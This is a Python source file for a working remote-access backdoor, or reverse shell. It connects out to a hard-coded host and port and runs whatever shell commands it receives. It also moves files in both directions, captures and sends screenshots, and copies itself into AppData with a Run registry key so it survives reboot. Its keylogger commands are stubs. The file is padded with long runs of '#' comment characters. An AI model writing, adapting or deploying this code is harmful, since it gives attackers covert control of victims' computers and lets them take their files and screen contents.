#! /usr/bin/env python3
import socket
import json
import subprocess
import os
import pyautogui
import threading
import shutil
import sys
import time
####################################################################
####################################################################


def recv() -> str:
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            ####################################################################
            continue
####################################################################


def send(data: str):
    json_data = json.dumps(data)
    s.send(json_data.encode())

####################################################################


def download_file(filename):
    with open(filename, 'wb') as f:
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk != None:
            f.write(chunk)
            try:
                ####################################################################
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
    s.settimeout(None)
    f.close()


def upload_file(filename):
    with open(filename, "rb") as f:
        data = f.read()
        f.close()
        ####################################################################
    s.send(data)


def screenshot():
    img = pyautogui.screenshot()
    img.save("screen.png")
    upload_file("screen.png")
    ####################################################################
    os.remove("screen.png")


def startup(regname: str, copyname: str):
    location = os.environ["appdata"] + "\\" + \
        str(os.listdir(os.environ["appdata"])[5]) + "\\" + copyname+'.pyw'
    os.popen(f"echo #. >> {location}")
    try:
        if not os.path.exists(location):
            shutil.copyfile(__file__, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' +
                            regname + ' /t REG_SZ /d "' + location + '"', shell=True)
            send(f"[+] Created REG {regname}, For startup.")
        else:
            send("[+] startup exists.")
    except Exception as e:
        send(f"[!] Error while creating registry.\n{str(e)}")


def conection():
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.1.109", 5555))
            shell()
            s.close()
            break
        except:
            conection()


def shell():
    while True:
        ####################################################################
        command = recv()
        if command == "quit" or command == "exit":
            break
        elif command == "help":
            send("")
            ####################################################################
            continue
        elif command == "clear":
            send("")
            continue
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "upload":
            download_file(command[7:])
            send("")
            ####################################################################
            continue
        elif command[:8] == "download":
            upload_file(command[9:])
            continue
        elif command == "screenshot":
            screenshot()
            continue
        elif command[:12] == "keylog_start":
            send("[!] KeyLogger found by anti-virus software.")
            continue
        elif command[:11] == "keylog_dump":
            send("[!] KeyLogger found by anti-virus software.")
            continue
        elif command[:11] == "keylog_stop":
            send("[!] KeyLogger found by anti-virus software.")
            continue
        elif command[:7] == "startup":
            regname, copyname = command[8:].split(" ")
            startup(regname, copyname)
            continue
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   ####################################################################
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        send(result)


####################################################################
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conection()
########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################
########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################

########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################
